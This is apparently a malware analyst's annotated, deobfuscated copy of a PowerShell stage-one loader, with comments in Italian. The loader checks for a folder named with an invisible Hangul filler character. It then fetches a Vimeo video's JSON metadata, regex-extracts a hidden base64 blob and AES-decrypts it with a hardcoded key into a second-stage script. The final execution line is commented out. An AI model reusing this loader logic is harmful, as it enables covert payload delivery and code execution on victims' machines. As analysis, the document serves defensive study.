$uuid = "665b830abe6311ed965fd83bbf1b5c98";

$vimeo_link = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6L" + "y92aW1lby5jb20vYXBp" + "L3YyL3ZpZGVvLzgwND" + "gzODg5NS5qc29u"));
# https://vimeo.com/api/v2/video/804838895.json

$encoded_private_key = "kvdrfWrnP0G1j0HlFPto3sjoSi3Bb6Jx8/MdnzyZt00=";

$current_location = $(get-location).Path;

$empty_character = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("44Wk"));
# "44Wk" rappresenta il carattere "hangul filler" (Unicode character U+3164) ed è un carattere invisibile

$full_path = $current_location + "\" + $empty_character + "\";

if (Test-Path -Path $full_path -PathType Container) {
	$vimeo_response = (new-object Net.WebClient).DownloadString($vimeo_link);
	# (Allegato come: 804838895.json)
	
	$encoded_blob = [regex]::Match($vimeo_response, "::\?\?(.*?)\?:\?:").Groups[1].Value;
	# Estrae del testo dalla risposta tramite la regex "::\?\?(.*?)\?:\?:".
	# Testo Estratto:
	'''
	isWGNh3EEA1OfVpZAKX1bsOGbM+iXv1cMQMVWJfqDg65ZO8rnd\\/iRGWkaE4SSP1n7NNpjHaZbW3iqVdluC1PAf64SaLgXSApXD7AUQ574t1Hv9L6nqtu8m2Zamls7F2nwuD6SN9vmOyx95OhXMnY\\/aEXvXeXbZiNBitLeE0QBcyHnH+\\/uy3GKVd2x7VbJ4\\/ln\\/TVRt+MujTwr438Ze\\/6pikSmpmNRpknfJBb7Tazm1Bhe70KiS+WGvTkm5fpgklFu5CHlWAmGciOsS+x9mMiL\\/R8tKIwWPRm0lzXXYWMd2uDKE7Lt+i2Cu8vmVPEWrqzfbV9A+USfc+h29kDEzkf\\/86h+739wPJKW1XV3yRtln8IZvVGXDJi0x3KLWUcQEOmuugGAxU9qpEn98N7YdLhOgpQ1mG+Pq51MYEkao3smQgZ97SFqgP3qchTXOXNgiG9UC2XWU6Ow\\/Nlkum1TR2GebSA1UENy2wx280IrDQm9vPm8M48HDQmhXnzwNoEIVOQgrJm467GKE42XsJ2he4HaJzwNUKcXKq0OLh7q9UmF4QABYB8bhPRzgHcABaKrQ6bfNEqyd\\/m45VELJ39xusg+WueqZngd\\/r3gK6SoNTHeaAkgjmus3qd7KCyI6y9wGhd21JMG8984FrsT7ff2foKD\\/sbC7Xmbs1qKJNCtXaukN\\/+izMTcJaC3H9ljs1pKd6L6fBvXQ8BnjuGwGeFR+J\\/cI33iqJnvReRDHm386P3nlKrc2YzVhO8kcNYZhh2Ti8oVVN77S1VKrk7sCEi57r+lL7AftyNBA3U4nUPGBCU8ndd4KDF+AStjGq0fP6KLXTNgsdnTZTBqcwWEcpKfOtw7paHCwvCWeNfy36VdaWFzlI8VukHLGQP7i6lkgPxhF+DNymOTPLzDXBaEjDZAh3mXBGvuxiP2EqIYEbRWwvwT7YqhC2EWLvIU4rI954CtY3HUiZgsM0W67qDl9DvhCF2210b23uwBQE9K32wn3DI6TB5EBH027dU17DRV3ABGyb4FgEM\\/xYJSKf8xbhpeHa\\/PZUtS2EeooCmOKLO8vWFKOCns4PZ0oUYCridQAo+sHehdM\\/EEy\\/EXRFHQxdldVUhQVg4WTNdH8x6PyyoSmXpBZ7aIjr7SXYva4qOzHcstFd3gNPvYDuo4yw53PnlyNPc3SxTGcHa4rVvKPutLj0AhrPlOmujuWJckWUEudBPg5GesIeFgVfuD8E9ghYwCqwt0QHpVw7hjYpIuamMzlpkT2LsFTCxQB8Y6qxrR6ye0xDZUwq03Sdy1EmUSPVOTFW085f5wNjbG\\/FRIPoMkZGgTez0Ny+dB3T9sPo9hKoUVlHwvDXLHFi9U8k6Zs7Xc3qxECzXv6tREp32p2hlivUllJWOTg0CkG8upLDw\\/39ie4rM4uEys7jTJ3dOrqm5Llx3A0k\\/Y1UGNYfn8Avmh\\/l71jo=
	'''
	
	$encoded_blob = $encoded_blob -replace "\\", "";
	# Rimuove le stringhe "\\"
	# Testo Ripulito:
	'''
	isWGNh3EEA1OfVpZAKX1bsOGbM+iXv1cMQMVWJfqDg65ZO8rnd/iRGWkaE4SSP1n7NNpjHaZbW3iqVdluC1PAf64SaLgXSApXD7AUQ574t1Hv9L6nqtu8m2Zamls7F2nwuD6SN9vmOyx95OhXMnY/aEXvXeXbZiNBitLeE0QBcyHnH+/uy3GKVd2x7VbJ4/ln/TVRt+MujTwr438Ze/6pikSmpmNRpknfJBb7Tazm1Bhe70KiS+WGvTkm5fpgklFu5CHlWAmGciOsS+x9mMiL/R8tKIwWPRm0lzXXYWMd2uDKE7Lt+i2Cu8vmVPEWrqzfbV9A+USfc+h29kDEzkf/86h+739wPJKW1XV3yRtln8IZvVGXDJi0x3KLWUcQEOmuugGAxU9qpEn98N7YdLhOgpQ1mG+Pq51MYEkao3smQgZ97SFqgP3qchTXOXNgiG9UC2XWU6Ow/Nlkum1TR2GebSA1UENy2wx280IrDQm9vPm8M48HDQmhXnzwNoEIVOQgrJm467GKE42XsJ2he4HaJzwNUKcXKq0OLh7q9UmF4QABYB8bhPRzgHcABaKrQ6bfNEqyd/m45VELJ39xusg+WueqZngd/r3gK6SoNTHeaAkgjmus3qd7KCyI6y9wGhd21JMG8984FrsT7ff2foKD/sbC7Xmbs1qKJNCtXaukN/+izMTcJaC3H9ljs1pKd6L6fBvXQ8BnjuGwGeFR+J/cI33iqJnvReRDHm386P3nlKrc2YzVhO8kcNYZhh2Ti8oVVN77S1VKrk7sCEi57r+lL7AftyNBA3U4nUPGBCU8ndd4KDF+AStjGq0fP6KLXTNgsdnTZTBqcwWEcpKfOtw7paHCwvCWeNfy36VdaWFzlI8VukHLGQP7i6lkgPxhF+DNymOTPLzDXBaEjDZAh3mXBGvuxiP2EqIYEbRWwvwT7YqhC2EWLvIU4rI954CtY3HUiZgsM0W67qDl9DvhCF2210b23uwBQE9K32wn3DI6TB5EBH027dU17DRV3ABGyb4FgEM/xYJSKf8xbhpeHa/PZUtS2EeooCmOKLO8vWFKOCns4PZ0oUYCridQAo+sHehdM/EEy/EXRFHQxdldVUhQVg4WTNdH8x6PyyoSmXpBZ7aIjr7SXYva4qOzHcstFd3gNPvYDuo4yw53PnlyNPc3SxTGcHa4rVvKPutLj0AhrPlOmujuWJckWUEudBPg5GesIeFgVfuD8E9ghYwCqwt0QHpVw7hjYpIuamMzlpkT2LsFTCxQB8Y6qxrR6ye0xDZUwq03Sdy1EmUSPVOTFW085f5wNjbG/FRIPoMkZGgTez0Ny+dB3T9sPo9hKoUVlHwvDXLHFi9U8k6Zs7Xc3qxECzXv6tREp32p2hlivUllJWOTg0CkG8upLDw/39ie4rM4uEys7jTJ3dOrqm5Llx3A0k/Y1UGNYfn8Avmh/l71jo=
	'''
	
	$aocb = [System.Convert]::FromBase64String($encoded_blob);
	# (Allegato come: aocb.text)

	$pla = $aocb[0..15];
	# La variabile $pla conterrà i primi 16 byte (128 bit) dell'array di byte $aocb, ovvero i valori compresi dall'indice 0 all'indice 15.
	# Bytes:
	'''
	138
	197
	134
	54
	29
	196
	16
	13
	78
	125
	90
	89
	0
	165
	245
	110
	'''
	
	$aes_object = New-Object "System.Security.Cryptography.AesManaged";	
	$aes_object.Mode = [System.Security.Cryptography.CipherMode]::CBC;
	$aes_object.Padding = [System.Security.Cryptography.PaddingMode]::Zeros;
	$aes_object.BlockSize = 128;
	$aes_object.KeySize = 256;
	# Setup e inizializzazione di un oggetto AES

	$aes_object.IV = $pla;
	# Imposta i byte precedentemente estratti come vettore di inizializzazione da utilizzare durante la crittografia simmetrica.
	
	$aes_object.Key = [System.Convert]::FromBase64String($encoded_private_key);
	# Imposta la chiave privata lol
	
	$decryptor = $aes_object.CreateDecryptor();
	# Crea un decryptor
	
	$strange_bytes = $decryptor.TransformFinalBlock($aocb, 16, $aocb.Length - 16);
	# (Allegato come tqkd.txt)
	# Fa qualcosa di strano con i byte, boh penso che serve tipo a decifrare forse
	
	$second_stage = [System.Text.Encoding]::UTF8.GetString($strange_bytes).Trim([char]0);
	# (Allegato come: stage_2.ps1)
	# Estrae del codice powershell.
	
	# Invoke-Expression $second_stage;
	# Ti piacerebbe
}